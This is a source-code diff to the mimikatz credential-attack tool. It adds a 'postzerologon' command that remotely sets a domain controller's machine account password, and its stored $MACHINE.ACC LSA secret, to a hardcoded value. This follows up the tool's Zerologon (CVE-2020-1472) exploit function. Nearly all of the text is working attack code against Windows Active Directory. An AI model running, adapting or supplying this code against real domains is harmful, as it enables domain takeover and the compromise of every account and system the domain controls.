@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -21,6 +21,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_packages,	L"packages",	NULL},
 	{kuhl_m_lsadump_mbc,		L"mbc",			NULL},
 	{kuhl_m_lsadump_zerologon,	L"zerologon",	NULL},
+	{kuhl_m_lsadump_update_dc_password, L"postzerologon",	NULL},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -2222,17 +2223,13 @@ NTSTATUS kuhl_m_lsadump_changentlm(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
 NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg)
 {
-	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
+	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME;
 	LSA_UNICODE_STRING serverName, userName;
 	PCWCHAR szServer, szUser;
 	BOOL isUser = FALSE, isRid = FALSE;
-	DWORD i, domainEnumerationContext = 0, domainCountRetourned, rid = 0, *pRid, *pUse;
-	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
-	PSID domainSid;
-	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
+	DWORD rid = 0;
 
 	kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL);
 	RtlInitUnicodeString(&serverName, szServer ? szServer : L"");
@@ -2250,7 +2247,25 @@ NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUs
 
 	if(isUser || isRid)
 	{
-		status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
+		status = kuhl_m_lsadump_enumdomains_users_data(&serverName, isUser ? &userName : NULL, rid, dwUserAccess, callback, pvArg);
+	}
+	else PRINT_ERROR(L"/user or /rid is needed\n");
+
+	return status;
+}
+
+DECLARE_CONST_UNICODE_STRING(uBuiltin, L"Builtin");
+NTSTATUS kuhl_m_lsadump_enumdomains_users_data(PLSA_UNICODE_STRING uServerName, PLSA_UNICODE_STRING uUserName, DWORD rid, DWORD dwUserAccess, PKUHL_M_LSADUMP_DOMAINUSER callback, PVOID pvArg)
+{
+	NTSTATUS status = STATUS_INVALID_ACCOUNT_NAME, enumDomainStatus;
+	DWORD i, domainEnumerationContext = 0, domainCountRetourned, *pRid, *pUse;
+	PSAMPR_RID_ENUMERATION pEnumDomainBuffer;
+	PSID domainSid;
+	SAMPR_HANDLE hServerHandle, hDomainHandle, hUserHandle;
+
+	if(uUserName || rid)
+	{
+		status = SamConnect(uServerName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
 		if(NT_SUCCESS(status))
 		{
 			do
@@ -2272,21 +2287,23 @@ NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUs
 							status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, domainSid, &hDomainHandle);
 							if(NT_SUCCESS(status))
 							{
-								if(isUser)
+								if(uUserName)
 								{
-									isRid = FALSE;
 									pRid = NULL;
 									pUse = NULL;
-									status = SamLookupNamesInDomain(hDomainHandle, 1, &userName, &pRid, &pUse);
+									status = SamLookupNamesInDomain(hDomainHandle, 1, uUserName, &pRid, &pUse);
 									if(NT_SUCCESS(status))
 									{
 										rid = pRid[0];
-										isRid = TRUE;
+										if(pRid)
+											SamFreeMemory(pRid);
+										if(pUse)
+											SamFreeMemory(pUse);
 									}
 									else PRINT_ERROR(L"SamLookupNamesInDomain: %08x\n", status);
 								}
 
-								if(isRid)
+								if(rid)
 								{
 									kprintf(L"User RID     : %u\n", rid);
 									status = SamOpenUser(hDomainHandle, dwUserAccess, rid, &hUserHandle);
@@ -2298,14 +2315,6 @@ NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUs
 									else PRINT_ERROR(L"SamOpenUser: %08x\n", status);
 								}
 								else PRINT_ERROR(L"No RID\n");
-
-								if(isUser)
-								{
-									if(pRid)
-										SamFreeMemory(pRid);
-									if(pUse)
-										SamFreeMemory(pUse);
-								}
 								SamCloseHandle(hDomainHandle);
 							}
 							else PRINT_ERROR(L"SamOpenDomain: %08x\n", status);
@@ -2322,7 +2331,8 @@ NTSTATUS kuhl_m_lsadump_enumdomains_users(int argc, wchar_t * argv[], DWORD dwUs
 		}
 		else PRINT_ERROR(L"SamConnect: %08x\n", status);
 	}
-	else PRINT_ERROR(L"/user or /rid is needed\n");
+	else PRINT_ERROR(L"username or rid is needed\n");
+
 	return status;
 }
 
@@ -2471,6 +2481,8 @@ handle_t __RPC_USER LOGONSRV_HANDLE_bind(IN LOGONSRV_HANDLE Name) {return hLogon
 void __RPC_USER LOGONSRV_HANDLE_unbind(IN LOGONSRV_HANDLE Name, handle_t hLogon) {}
 
 const wchar_t * SecureChannelTypes[] = {L"Null", L"MsvAp", L"Workstation", L"TrustedDnsDomain", L"TrustedDomain", L"UasServer", L"Server", L"CdcServer"};
+/*	This function `zerologon` is inspired by @SecuraBV work on CVE-2020-1472
+*/
 NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 {
 	NTSTATUS status;
@@ -2556,6 +2568,69 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 		else PRINT_ERROR(L"Missing /account argument, usually a DC$ account\n");
 	}
 	else PRINT_ERROR(L"Missing /target argument, can be IP or FQDN of a domain controller\n");
+
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS CALLBACK kuhl_m_lsadump_update_dc_password_callback(SAMPR_HANDLE hUser, PVOID pvArg)
+{
+	NTSTATUS status = SamSetInformationUser(hUser, UserSetPasswordInformation, (PSAMPR_USER_INFO_BUFFER) pvArg);
+	if(NT_SUCCESS(status))
+		kprintf(L"\n  > Password updated (to %wZ)\n", pvArg);
+	else PRINT_ERROR(L"SamSetInformationUser: %08x\n", status);
+	return status;
+}
+
+DECLARE_CONST_UNICODE_STRING(uMachineAccountPassword, L"Waza1234/Waza1234/Waza1234/");
+DECLARE_CONST_UNICODE_STRING(uMachineSecretName, L"$MACHINE.ACC");
+NTSTATUS kuhl_m_lsadump_update_dc_password(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	PCWCHAR szTarget, szAccount;
+	UNICODE_STRING Target, AccoutName;
+	LSA_OBJECT_ATTRIBUTES ObjectAttributes = {0};
+	LSA_HANDLE hPolicy, hSecret;
+	ObjectAttributes.Length = sizeof(ObjectAttributes);
+
+	kprintf(L"\nProcedure to update AD domain password and its local stored password remotely\nmimic `netdom resetpwd`, experimental & best situation after reboot\n\n");
+	if(kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
+	{
+		RtlInitUnicodeString(&Target, szTarget);
+		kprintf(L"Target : %wZ\n", &Target);
+		if(kull_m_string_args_byName(argc, argv, L"account", &szAccount, NULL))
+		{
+			RtlInitUnicodeString(&AccoutName, szAccount);
+			kprintf(L"Account: %wZ\n", &AccoutName);
+		}
+		else PRINT_ERROR(L"A /account argument is needed\n");
+	}
+	else PRINT_ERROR(L"A /server argument is needed\n");
+
+	kprintf(L"\n* SAM information\n\n");
+	status = kuhl_m_lsadump_enumdomains_users_data(&Target, &AccoutName, 0, USER_FORCE_PASSWORD_CHANGE, kuhl_m_lsadump_update_dc_password_callback, (PVOID) &uMachineAccountPassword);
+	if(status == STATUS_SUCCESS)
+	{
+		kprintf(L"\n* Computer stored password\n\n");
+		status = LsaOpenPolicy(&Target, &ObjectAttributes, POLICY_CREATE_SECRET, &hPolicy);
+		if(status == STATUS_SUCCESS)
+		{
+			status = LsaOpenSecret(hPolicy, (PLSA_UNICODE_STRING) &uMachineSecretName, SECRET_SET_VALUE, &hSecret);
+			if(status == STATUS_SUCCESS)
+			{
+				status = LsaSetSecret(hSecret, (PLSA_UNICODE_STRING) &uMachineAccountPassword, (PLSA_UNICODE_STRING) &uMachineAccountPassword);
+				if(status == STATUS_SUCCESS)
+				{
+					kprintf(L"  > Password updated (to %wZ)\n", &uMachineAccountPassword);
+				}
+				else PRINT_ERROR(L"LsaSetSecret: 0x%08x\n", status);
+
+				LsaClose(hSecret);
+			}
+			else PRINT_ERROR(L"LsaOpenSecret: 0x%08x\n", status);
+			LsaClose(hPolicy);
+		}
+		else PRINT_ERROR(L"LsaOpenPolicy: 0x%08x\n", status);
+	}
 
 	return STATUS_SUCCESS;
 }
